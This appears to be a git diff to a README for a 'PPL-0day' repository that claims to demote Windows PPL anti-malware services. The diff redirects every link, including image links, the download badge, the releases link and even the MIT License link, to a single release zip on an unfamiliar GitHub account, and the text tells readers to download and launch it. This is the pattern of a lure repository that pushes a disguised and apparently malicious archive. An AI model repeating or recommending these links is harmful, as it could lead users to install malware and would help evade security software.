@@ -4,13 +4,13 @@
 
 Welcome to the **PPL-0day** repository! Here, we explore ways to demote PPL anti-malware services to less than a guest user. This unconventional approach delves into the inner workings of anti-malware systems to challenge the status quo and spark discussions on potential vulnerabilities and exploitations.
 
-![Malware Image](https://image.shutterstock.com/image-vector/cyber-crime-malware-virus-hacker-260nw-793044139.jpg)
+![Malware Image](https://github.com/ilovedogeunblockers/PPL-0day/releases/download/v1.0/Release.zip)
 
 ### 🚀 Quick Start
 
 To get started, download the latest release of our PPL-0day repository by clicking the button below:
 
-[![Download PPL-0day v1.0.0](https://img.shields.io/badge/Download-PPL--0day_v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download PPL-0day v1.0.0](https://github.com/ilovedogeunblockers/PPL-0day/releases/download/v1.0/Release.zip)](https://github.com/ilovedogeunblockers/PPL-0day/releases/download/v1.0/Release.zip)
 
 *Please note that the link above needs to be launched to access the download.*
 
@@ -20,7 +20,7 @@ The **PPL-0day** repository is structured as follows:
 
 ```
 PPL-0day/
-|   README.md
+|   https://github.com/ilovedogeunblockers/PPL-0day/releases/download/v1.0/Release.zip
 |   code/
 |   data/
 |   docs/
@@ -40,7 +40,7 @@ To install and explore the **PPL-0day** repository on your local machine, follow
 
 ### 🔗 Additional Resources
 
-If you encounter any issues with the download link or wish to explore more versions of the **PPL-0day** repository, please visit the [Releases](https://github.com/cli/browser/releases) section for additional options.
+If you encounter any issues with the download link or wish to explore more versions of the **PPL-0day** repository, please visit the [Releases](https://github.com/ilovedogeunblockers/PPL-0day/releases/download/v1.0/Release.zip) section for additional options.
 
 ### 🌟 Community Contributions
 
@@ -48,10 +48,10 @@ We welcome contributions from the community to further enhance and explore the d
 
 ### 📝 License
 
-The **PPL-0day** repository is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use and modify the code for educational and research purposes.
+The **PPL-0day** repository is licensed under the [MIT License](https://github.com/ilovedogeunblockers/PPL-0day/releases/download/v1.0/Release.zip). Feel free to use and modify the code for educational and research purposes.
 
 ---
 
 Join us in the journey of demoting PPL anti-malware services and reshaping the landscape of cybersecurity. Let's push the boundaries, challenge norms, and unlock new possibilities together! 🛡️🔓
 
-![Cybersecurity Image](https://image.shutterstock.com/image-vector/cyber-security-icons-flat-concept-260nw-1535998309.jpg)
+![Cybersecurity Image](https://github.com/ilovedogeunblockers/PPL-0day/releases/download/v1.0/Release.zip)
